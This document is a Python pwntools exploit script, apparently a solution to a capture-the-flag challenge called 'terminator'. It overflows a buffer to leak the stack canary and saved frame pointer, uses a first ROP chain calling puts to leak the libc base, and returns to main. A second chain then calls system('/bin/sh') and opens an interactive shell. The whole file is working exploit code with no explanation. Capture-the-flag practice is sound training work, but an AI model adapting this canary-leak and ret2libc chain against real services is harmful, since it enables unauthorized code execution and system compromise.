#!/usr/bin/env python3

from pwn import *

elf = ELF("./terminator_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf


def conn():
    if args.REMOTE:
        p = remote('terminator.challs.olicyber.it', 10307)
    elif args.GDB:
            p = gdb.debug([elf.path], '''
    b welcome
    c
    ''')
    else:
        p = process([elf.path])

    return p


def main():
    p = conn()

    p.sendafter(b'> ', 'a'*56)
    p.recvline()
    canary = u64(b'\x00' + p.recv(7))
    print(f"Canary {hex(canary)}")
    rbp = u64(p.recv(6).ljust(8,b'\x00')) -32
    buffer_addr = rbp - 72
    print(f"RBP {hex(rbp)}")
    print(f"Buffer Addr {hex(buffer_addr)}")
    payload = flat ([
        0x00000000004012fb, #  pop rdi; ret; 
        elf.got['puts'],
        elf.plt['puts'],
        0x0000000000401016, #: ret; 
        elf.sym['main'],
        0,
        0,
        canary,
        buffer_addr,
    ])

    
    p.sendafter(b'> ', payload)
    p.recvline()
    libc.address = u64(p.recvline().strip().ljust(8,b'\x00'))- libc.sym['puts']
    print(f"Libc Base {hex(libc.address)}")

    ## Secondo giro a main

    p.recvline()
    p.sendafter(b'> ', b'a'*56)
    p.recvline()
    canary = u64(b'\x00' + p.recv(7))
    print(f"Canary {hex(canary)}")
    rbp2 = rbp-64 
    buffer_addr2 = rbp2 - 72
    print(f"RBP {hex(rbp2)}")
    print(f"Buffer Addr {hex(buffer_addr2)}")

    bin_sh = libc.search(b'/bin/sh\x00').__next__()

    payload2 = flat ([
        0x00000000004012fb, #  pop rdi; ret; 
        bin_sh,
        0x0000000000401016, #: ret; 
        0x0000000000401016, #: ret; 
        libc.sym['system'],
        0,
        0,
        canary,
        buffer_addr2,
    ])
    p.recvline()
    p.sendafter(b'> ',payload2)
    p.interactive()
if __name__ == "__main__":
    main()
